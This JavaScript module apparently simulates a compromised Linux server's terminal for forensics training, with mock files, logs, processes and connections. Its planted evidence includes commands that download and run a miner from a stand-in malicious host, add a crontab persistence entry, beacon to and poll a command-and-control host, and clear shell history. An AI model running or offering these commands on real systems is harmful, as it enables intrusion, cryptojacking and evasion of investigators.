// 模拟Linux终端文件系统
const fileSystem = {
  '/': {
    type: 'dir',
    children: ['home', 'var', 'tmp', 'etc', 'usr']
  },
  '/home': {
    type: 'dir',
    children: ['admin', 'suspicious_user']
  },
  '/home/admin': {
    type: 'dir',
    children: ['.bash_history', 'documents']
  },
  '/home/admin/.bash_history': {
    type: 'file',
    content: `ls -la
cd /tmp
wget http://malicious.com/miner.sh
chmod +x miner.sh
./miner.sh
echo "*/5 * * * * /tmp/.hidden_miner" | crontab -
curl http://c2server.com/beacon
nohup /tmp/.systemd-monitor &
ps aux | grep python
netstat -tulpn | grep LISTEN
cat /etc/passwd
history -c`
  },
  '/tmp': {
    type: 'dir',
    children: ['.hidden_miner', '.systemd-monitor', 'miner.sh']
  },
  '/tmp/.hidden_miner': {
    type: 'file',
    content: '#!/bin/bash\n# Mining script\nxmrig --cpu-max-threads-hint=100'
  },
  '/tmp/.systemd-monitor': {
    type: 'file',
    content: '#!/bin/bash\n# Backdoor process\nwhile true; do curl http://c2.evil.com/cmd; sleep 60; done'
  },
  '/var': {
    type: 'dir',
    children: ['log', 'www']
  },
  '/var/log': {
    type: 'dir',
    children: ['auth.log', 'syslog', 'apache2']
  },
  '/var/log/auth.log': {
    type: 'file',
    content: `Jan 15 10:23:11 server sshd[12345]: Failed password for root from 192.168.1.100 port 52134 ssh2
Jan 15 10:23:15 server sshd[12346]: Failed password for root from 192.168.1.100 port 52135 ssh2
Jan 15 10:23:18 server sshd[12347]: Failed password for admin from 192.168.1.100 port 52136 ssh2
Jan 15 10:23:21 server sshd[12348]: Failed password for admin from 192.168.1.100 port 52137 ssh2
Jan 15 10:23:24 server sshd[12349]: Accepted password for admin from 192.168.1.100 port 52138 ssh2
Jan 15 10:25:30 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Jan 15 10:26:15 server sshd[12350]: Accepted publickey for admin from 192.168.1.100 port 52140 ssh2`
  },
  '/etc': {
    type: 'dir',
    children: ['passwd', 'hosts', 'crontab']
  },
  '/etc/passwd': {
    type: 'file',
    content: `root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
suspicious_user:x:1001:1001::/home/suspicious_user:/bin/bash`
  }
};

// 模拟进程列表
const processList = `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  18500  1980 ?        Ss   00:00   0:02 /sbin/init
root       123  0.0  0.2  32400  2800 ?        S    00:01   0:00 /usr/sbin/sshd
admin     1337 95.2  2.1 456000 21500 ?        R    10:25  45:30 /tmp/.systemd-monitor
admin     1338  0.1  0.3  12400  3200 pts/0    Ss   10:25   0:00 bash
root      2456  0.0  0.5  65400  5200 ?        Ssl  00:05   0:01 /usr/sbin/apache2`;

// 模拟网络连接
const networkConnections = `Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      123/sshd
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      2456/apache2
tcp        0      0 10.0.1.15:33456         185.220.101.5:4444      ESTABLISHED 1337/systemd
tcp        0      0 10.0.1.15:22            192.168.1.100:52138     ESTABLISHED 12349/sshd`;

class LinuxTerminal {
  constructor() {
    this.currentPath = '/home/admin';
    this.history = [];
    this.commandHistory = [
      'ls -la',
      'cd /tmp',
      'wget http://malicious.com/miner.sh',
      'chmod +x miner.sh',
      './miner.sh',
      'echo "*/5 * * * * /tmp/.hidden_miner" | crontab -',
      'nohup /tmp/.systemd-monitor &',
      'history'
    ];
  }

  execute(command) {
    const cmd = command.trim();
    this.history.push(cmd);

    const parts = cmd.split(' ');
    const baseCmd = parts[0];

    switch (baseCmd) {
      case 'pwd':
        return this.currentPath;

      case 'ls':
        return this.ls(parts);

      case 'cd':
        return this.cd(parts[1]);

      case 'cat':
        return this.cat(parts[1]);

      case 'history':
        return this.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n');

      case 'ps':
        if (parts.includes('aux') || parts.includes('-aux')) {
          return processList;
        }
        return 'USER       PID %CPU %MEM COMMAND\nadmin     1338  0.0  0.3 bash';

      case 'netstat':
        if (parts.includes('-tulpn')) {
          return networkConnections;
        }
        return networkConnections;

      case 'whoami':
        return 'admin';

      case 'clear':
        return '__CLEAR__';

      case 'help':
        return this.help();

      default:
        return `bash: ${baseCmd}: command not found`;
    }
  }

  ls(parts) {
    const path = parts[1] || this.currentPath;
    const fullPath = this.resolvePath(path);
    const node = this.getNode(fullPath);

    if (!node) {
      return `ls: cannot access '${path}': No such file or directory`;
    }

    if (node.type === 'file') {
      return path;
    }

    const showHidden = parts.includes('-a') || parts.includes('-la') || parts.includes('-al');
    let children = node.children || [];

    if (showHidden && fullPath !== '/') {
      children = ['.', '..', ...children];
    }

    if (parts.includes('-l') || parts.includes('-la') || parts.includes('-al')) {
      return children.map(name => {
        if (name === '.' || name === '..') {
          return `drwxr-xr-x 2 admin admin 4096 Jan 15 10:20 ${name}`;
        }
        const childPath = fullPath === '/' ? `/${name}` : `${fullPath}/${name}`;
        const childNode = this.getNode(childPath);
        if (childNode?.type === 'dir') {
          return `drwxr-xr-x 2 admin admin 4096 Jan 15 10:20 ${name}`;
        } else if (name.startsWith('.')) {
          return `-rwxr-xr-x 1 root root 8192 Jan 15 03:22 ${name}`;
        } else {
          return `-rw-r--r-- 1 admin admin 1234 Jan 15 10:20 ${name}`;
        }
      }).join('\n');
    }

    return children.join('  ');
  }

  cd(path) {
    if (!path || path === '~') {
      this.currentPath = '/home/admin';
      return '';
    }

    const newPath = this.resolvePath(path);
    const node = this.getNode(newPath);

    if (!node) {
      return `cd: ${path}: No such file or directory`;
    }

    if (node.type !== 'dir') {
      return `cd: ${path}: Not a directory`;
    }

    this.currentPath = newPath;
    return '';
  }

  cat(path) {
    if (!path) {
      return 'cat: missing file operand';
    }

    const fullPath = this.resolvePath(path);
    const node = this.getNode(fullPath);

    if (!node) {
      return `cat: ${path}: No such file or directory`;
    }

    if (node.type === 'dir') {
      return `cat: ${path}: Is a directory`;
    }

    return node.content || '';
  }

  resolvePath(path) {
    if (path.startsWith('/')) {
      return path;
    }

    if (path === '..') {
      return this.currentPath.split('/').slice(0, -1).join('/') || '/';
    }

    if (path === '.') {
      return this.currentPath;
    }

    return this.currentPath === '/' ? `/${path}` : `${this.currentPath}/${path}`;
  }

  getNode(path) {
    return fileSystem[path];
  }

  help() {
    return `Available commands:
  ls [-la]        - list directory contents
  cd <dir>        - change directory
  cat <file>      - display file contents
  pwd             - print working directory
  history         - show command history
  ps aux          - show process list
  netstat -tulpn  - show network connections
  whoami          - print current user
  clear           - clear the screen
  help            - show this help message`;
  }
}

export { LinuxTerminal, fileSystem };
